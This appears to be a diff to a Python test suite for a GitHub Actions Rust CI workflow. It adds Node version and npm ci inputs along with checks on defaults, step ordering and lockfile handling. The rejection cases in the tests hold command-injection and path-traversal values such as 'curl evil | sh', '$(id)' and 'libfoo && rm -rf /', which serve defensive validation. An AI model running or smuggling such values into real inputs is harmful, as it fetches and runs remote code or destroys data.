@@ -39,6 +39,8 @@ def validate(**inputs: str) -> subprocess.CompletedProcess:
         "IN_TEST": "--workspace",
         "IN_TEST_EXCEPTIONS": "",
         "IN_APT": "",
+        "IN_NODE": "",
+        "IN_NPM_CI": "false",
         "IN_TOOLCHAIN": "",
         "IN_FEATURES": "",
         "IN_PREFIX": "rustc",
@@ -132,6 +134,8 @@ class ValidateInputs(unittest.TestCase):
             ("IN_FEATURES", "all"),
             ("IN_FEATURES", "serde,tokio/full"),
             ("IN_PREFIX", "rustc-2"),
+            ("IN_NODE", "22"),
+            ("IN_NODE", "22.14.0"),
         ):
             self.assertEqual(validate(**{field: ok}).returncode, 0, (field, ok))
 
@@ -140,6 +144,9 @@ class ValidateInputs(unittest.TestCase):
             ("IN_CLIPPY", "--workspace; curl evil | sh"),
             ("IN_TEST", "$(id)"),
             ("IN_APT", "libfoo && rm -rf /"),
+            ("IN_NODE", "22; echo unsafe"),
+            ("IN_NODE", "$(id)"),
+            ("IN_NODE", "../../node"),
             ("IN_WORKSPACE", "../other"),
             ("IN_WORKSPACE", "/etc"),
             ("IN_CLASS", "ubuntu-latest"),
@@ -155,6 +162,57 @@ class ValidateInputs(unittest.TestCase):
         ):
             out = validate(**{field: bad})
             self.assertEqual(out.returncode, 2, (field, bad))
+
+
+class NodeDependencies(unittest.TestCase):
+    def test_opt_in_requires_declared_node_version(self) -> None:
+        self.assertEqual(validate(IN_NPM_CI="true").returncode, 2)
+        self.assertEqual(validate(IN_NPM_CI="true", IN_NODE="22").returncode, 0)
+
+    def test_disabled_defaults_do_not_install_node_or_packages(self) -> None:
+        inputs = yaml.safe_load(WORKFLOW.read_text())[True]["workflow_call"]["inputs"]
+        self.assertEqual(inputs["node-version"]["default"], "")
+        self.assertIs(inputs["npm-ci"]["default"], False)
+        self.assertEqual(step("Node for tests")["if"], "inputs.node-version != ''")
+        self.assertEqual(step("JavaScript test dependencies")["if"], "inputs.npm-ci")
+
+    def test_dependencies_are_installed_before_cargo_checks_without_extra_cache(self) -> None:
+        setup = step("Node for tests")
+        self.assertRegex(setup["uses"], r"^actions/setup-node@[0-9a-f]{40}$")
+        self.assertIs(setup["with"]["package-manager-cache"], False)
+        install = step("JavaScript test dependencies")
+        self.assertEqual(install["working-directory"], "${{ inputs.workspace }}")
+        self.assertIn("npm ci --ignore-scripts --include=dev --no-audit --no-fund", install["run"])
+        names = [s.get("name") for s in job()["steps"]]
+        for later in ("Clippy", "Test"):
+            self.assertLess(names.index("JavaScript test dependencies"), names.index(later))
+
+    def test_real_consumer_participates_in_the_required_gate(self) -> None:
+        jobs = yaml.safe_load((ROOT / ".github/workflows/project-control.yml").read_text())["jobs"]
+        consumer = jobs["rust-node-consumer"]
+        self.assertEqual(consumer["uses"], "./.github/workflows/rust-ci.yml")
+        self.assertEqual(consumer["with"]["node-version"], "22")
+        self.assertIs(consumer["with"]["npm-ci"], True)
+        self.assertIn("rust-node-consumer", jobs["ci-ok"]["needs"])
+        self.assertIn("rust-node-consumer", jobs["ci-ok"]["steps"][-1]["with"]["required"])
+
+    def test_install_refuses_missing_lock_before_npm_and_preserves_npm_failure(self) -> None:
+        with tempfile.TemporaryDirectory() as directory:
+            root = pathlib.Path(directory)
+            npm = root / "npm"
+            npm.write_text("#!/bin/sh\nprintf '%s\\n' \"$*\" > npm-called\nexit 17\n")
+            npm.chmod(0o755)
+            env = {**os.environ, "PATH": str(root) + os.pathsep + os.environ["PATH"]}
+            command = ["bash", "-c", step("JavaScript test dependencies")["run"]]
+            (root / "package.json").write_text("{}")
+            absent = subprocess.run(command, cwd=root, env=env, capture_output=True)
+            self.assertNotEqual(absent.returncode, 0)
+            self.assertFalse((root / "npm-called").exists())
+            (root / "package-lock.json").write_text("{}")
+            failed = subprocess.run(command, cwd=root, env=env, capture_output=True)
+            self.assertEqual(failed.returncode, 17)
+            self.assertEqual((root / "npm-called").read_text().strip(),
+                             "ci --ignore-scripts --include=dev --no-audit --no-fund")
 
 
 class TestExecution(unittest.TestCase):
